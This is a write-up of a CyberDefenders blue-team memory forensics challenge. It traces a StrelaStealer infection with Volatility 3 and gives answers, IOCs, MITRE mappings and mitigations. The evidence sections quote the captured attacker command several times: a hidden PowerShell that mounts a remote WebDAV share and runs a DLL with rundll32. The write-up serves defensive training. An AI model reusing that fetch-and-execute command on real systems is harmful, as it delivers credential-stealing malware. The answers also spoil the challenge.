# CyberDefenders - Reveal (Memory Forensics) Write-up

**Challenge:** [Reveal](https://cyberdefenders.org/blueteam-ctf-challenges/reveal/)  
**Platform:** [CyberDefenders](https://cyberdefenders.org/)  
**Tags:** Endpoint forensics, memory forensics, Volatility 3, StrelaStealer

---

## Summary

A financial-institution workstation memory dump shows hidden **`powershell.exe`** (PID **3692**, PPID **4120**, user **Elon**) mapping a WebDAV share **`\\45.9.74.32@8888\davwwwroot\`** and executing second-stage **`3435.dll`** via **`rundll32`** (**T1218.011**). ANY.RUN correlation ties the infrastructure to **StrelaStealer** — an email/credential stealer often delivered through ISO/LNK chains.

---

## Scenario

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine.

---

## Objectives

- Analyze the memory dump for signs of compromise.
- Trace process hierarchy, command lines, and second-stage execution.
- Correlate findings with threat intelligence to identify the malware family.

---

## Environment

- **Artifact:** `192-Reveal.dmp` (Windows memory image, lab ZIP)
- **Capture time (from processes):** 2024-07-15 ~07:00 UTC
- **Tools:** [Volatility 3](https://github.com/volatilityfoundation/volatility3), [ANY.RUN](https://any.run/) (malware family correlation)

**Volatility 3 commands:**

```text
vol -f 192-Reveal.dmp -q windows.pstree
vol -f 192-Reveal.dmp -q windows.cmdline
vol -f 192-Reveal.dmp -q windows.getsids --pid 3692
```

---

## Evidence & Findings

### T1 — Malicious process name

**Question:** Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

- **What I checked:** **`windows.pstree`** and **`windows.cmdline`** for suspicious parent/child chains and encoded/hidden execution.
- **Evidence:**

  ```text
  vol -f 192-Reveal.dmp -q windows.pstree

  3692  4120  powershell.exe  ...  powershell.exe -windowstyle hidden
        net use \\45.9.74.32@8888\davwwwroot\ ;
        rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
    * 2416  3692  net.exe
    * 6892  3692  conhost.exe
  ```

  ```text
  vol -f 192-Reveal.dmp -q windows.cmdline

  3692  powershell.exe  powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ;
        rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  2416  net.exe  "C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\
  ```

- **Reasoning:** Hidden PowerShell maps a remote WebDAV share then invokes **`rundll32`** on a remote DLL — classic second-stage loader behavior. **`powershell.exe`** is the malicious orchestrator (not the benign parent alone).

**Answer:** **`powershell.exe`**

---

### T2 — Parent PID of malicious process

**Question:** Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

- **What I checked:** **`windows.pstree`** — parent column for PID **3692** (`powershell.exe`).
- **Evidence:** PPID **`4120`** for **`powershell.exe`** (PID 3692).
- **Reasoning:** PPID links the malicious PowerShell instance back to whatever spawned it (initial access / user action / prior stager).

**Answer:** **`4120`**

---

### T3 — Second-stage payload filename

**Question:** Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

- **What I checked:** Command line on PID **3692** — **`rundll32`** arguments.
- **Evidence:**

  ```text
  rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  ```

- **Reasoning:** **`rundll32`** loads **`3435.dll`** from the attacker-controlled WebDAV path and calls export **`entry`** — the DLL is the second-stage payload.

**Answer:** **`3435.dll`**

---

### T4 — Remote shared directory name

**Question:** Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

- **What I checked:** **`net use`** and **`rundll32`** UNC paths in **`windows.cmdline`**.
- **Evidence:**

  ```text
  net use \\45.9.74.32@8888\davwwwroot\
  rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  ```

  Share name on host **`45.9.74.32`** (non-standard port **8888**): **`davwwwroot`**.

- **Reasoning:** WebDAV default publishing root is commonly named **`davwwwroot`**; both **`net.exe`** and **`rundll32`** reference the same share.

**Answer:** **`davwwwroot`**

---

### T5 — MITRE sub-technique (proxy execution)

**Question:** What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

- **What I checked:** MITRE ATT&CK mapping for **`rundll32.exe`** proxy execution.
- **Evidence:** Second stage invoked via **`rundll32 \\...\3435.dll,entry`** — not direct execution of the DLL.
- **Reasoning:** [T1218.011 — System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/) describes abusing **`rundll32.exe`** to run malicious code and evade direct-detection rules.

**Answer:** **`T1218.011`**

---

### T6 — Username under which malicious process runs

**Question:** Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

- **What I checked:** Volatility 3 **`windows.getsids`** for PID **3692**.
- **Evidence:**

  ```text
  vol -f 192-Reveal.dmp -q windows.getsids --pid 3692

  3692  powershell.exe  S-1-5-21-3274565340-3808842250-3617890653-1001  Elon
  ```

- **Reasoning:** SID **…-1001** is a standard interactive user RID; account **Elon** has access to sensitive financial data on this workstation — scope credential reset and session review.

**Answer:** **`Elon`**

---

### T7 — Malware family

**Question:** Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

- **What I checked:** ANY.RUN report for remote host **`45.9.74.32`** / related sample activity.
- **Evidence:** [ANY.RUN report](https://any.run/report/fb1329c6111daa33362cdb6664a7081de51367c9ca61138b11023faf9fc547b7/c3fcb822-d3a5-421f-8eb0-bd3d5c319f05) tags/correlates activity with **StrelaStealer**.
- **Reasoning:** StrelaStealer is a commodity infostealer targeting email credentials; WebDAV-hosted DLL staging matches known delivery patterns for this family.

**Answer:** **`StrelaStealer`**

---

## Key IOCs

| Type | Indicator |
|------|-----------|
| **Malicious process** | `powershell.exe` (PID **3692**, PPID **4120**) |
| **Compromised user** | `Elon` |
| **Remote host** | `45.9.74.32:8888` (WebDAV) |
| **Share** | `davwwwroot` |
| **Second-stage DLL** | `3435.dll` (export `entry`) |
| **Proxy binary** | `rundll32.exe` |
| **Child processes** | `net.exe`, `conhost.exe` |
| **Malware family** | StrelaStealer |
| **Memory dump** | `192-Reveal.dmp` |

---

## Attack reconstruction

```text
[Initial access — parent PID 4120]
    → powershell.exe -windowstyle hidden (PID 3692, user Elon)
    → net use \\45.9.74.32@8888\davwwwroot\
    → rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry  (T1218.011)
    → StrelaStealer second stage (credential/email theft)
```

---

## MITRE ATT&CK

| Technique | Name | Lab tie-in |
|-----------|------|------------|
| **T1059.001** | PowerShell | Hidden PowerShell orchestration (T1) |
| **T1020** | Automated Exfiltration | StrelaStealer objective (T7) |
| **T1218.011** | Rundll32 | Second-stage DLL via rundll32 (T3, T5) |
| **T1105** | Ingress Tool Transfer | Remote DLL over WebDAV (T3–T4) |
| **T1071** | Application Layer Protocol | WebDAV on TCP/8888 |
| **T1036** | Masquerading | Legitimate `net.exe` / `rundll32` abuse |

---

## Mitigation / hardening

1. Block egress to **`45.9.74.32`** and non-standard WebDAV ports (**8888**) where not required.
2. PowerShell logging + Constrained Language Mode; alert on **`-windowstyle hidden`** with **`net use`** + **`rundll32`** UNC paths.
3. Reset credentials and sessions for user **Elon**; review mailboxes for StrelaStealer exfil indicators.
4. EDR rules: **`rundll32`** loading DLLs from **`\\*@*`** WebDAV UNC paths.
5. Email security — StrelaStealer often arrives via malicious attachments/ISO; block matching campaigns.

---

## References

- Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/reveal/
- Volatility 3: https://github.com/volatilityfoundation/volatility3
- MITRE T1218.011: https://attack.mitre.org/techniques/T1218/011/
- ANY.RUN report: https://any.run/report/fb1329c6111daa33362cdb6664a7081de51367c9ca61138b11023faf9fc547b7/c3fcb822-d3a5-421f-8eb0-bd3d5c319f05
